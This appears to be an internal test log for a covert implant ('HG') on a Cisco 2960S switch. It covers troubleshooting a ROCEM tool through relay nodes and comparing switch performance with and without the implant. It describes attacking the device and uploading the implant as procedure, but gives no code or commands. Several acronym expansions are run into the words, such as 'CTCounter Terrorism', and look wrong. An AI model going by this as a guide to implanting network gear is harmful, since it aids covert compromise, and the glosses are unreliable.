JQJHAIRPIECE - HG Testing
HG was delivered for JQJHAIRPIECE on 8/21/2015 for the Cisco 2960S.  CONOP will be to FLXFluxwire to 192.168.3.40 and then .  Testing will be limited to performance testing and SMITE in order to provide a quick turn around for Operator. Also need to test SMITE rules that exclude an internal web server (Xetron can help GIPPLE craft these rules).
Testing summary

ROC-12 - EAREnterprise Archive 5471 - ROCEM set/unset does not work with flux.  This issue was fixed by Xetron in ROCEM v1.2, delivered to TR on 08/27/15
ROCEM regression testing included - test of set/unset feature fixed, test of complete CONOPConcealed Operation for use with HG, test ROCEM interactive session, and ad-hoc tests
Received exact model 2960S 8/31 and installed
Performance testing shows HG has little to no impact at traffic levels tested:

 


 
50M no HG
50M w HG
500M no HG
500M w HG

Set rocem
Could not set/unset rocem through flux, but tried outside of flux and it works fine. For purposes of smoke testing, continuing without flux.

Characterization of ROCEM issues with Flux - ROC-12
Collected wiresharks of failed set attempts and successful interactive attempts from flux, icon, and rocem log files and sent all to Xetron.
Tried using -c flag to change chunk size in ROCEM and tried every size in increments of 50 between 100 and 1500 - ROCEM still would not set through flux.
Tried building a flux node with mtu set to 1500 - no luck, ROCEM would not work.
Tried using a different flux node, from CMNCaiman (Codename)? testing, at 172.20.19.11 to attempt to flux from outside the network - no difference, rocem would not set.


IXIA performance test - Baseline - no HG
Reloaded DUTDevice Under Test to start with a clean configuration
Set up IXIA test to run on clean device using Hairpiece NN and the following test parameters:
50M of constant traffic
50 internal hosts
50 upstream hosts
4 hour test kicked off at 11:40


Test complete, saved solarwinds grapsh of CPU, MEM and latency.  No alarming spikes, switch was not stressed with this amount of traffic.
Saved test report to share as well.


IXIA performance test - Repeat test 3 but with HG installed
Reload DUTDevice Under Test to start with a clean device
Set ROCEM without using flux
Attacked with IACInternational Access Code and uploaded HG
Established CTCounter Terrorism session
Kicked off IXIA test at 4:30 PM
Collected output including report and solarwinds and saved to share.  Basically no impact when HG added at 50M of traffic.


IXIA performance test - Higher stress - 500M test - no HG
Reload DUTDevice Under Test to start with a clean device
Setup IXIA to run with same parameters as Test 3, except 500M of traffic - Kicked off at 4:20
Collected Report and solarwinds graphs


IXIA performance test - Repeat test 5 but with HG installed
Reload DUTDevice Under Test to start with a clean device
Set ROCEM without using flux
Attack with IACInternational Access Code and upload HG
Establish CTCounter Terrorism session
Kick off IXIA test at 500M at 9:20 AM
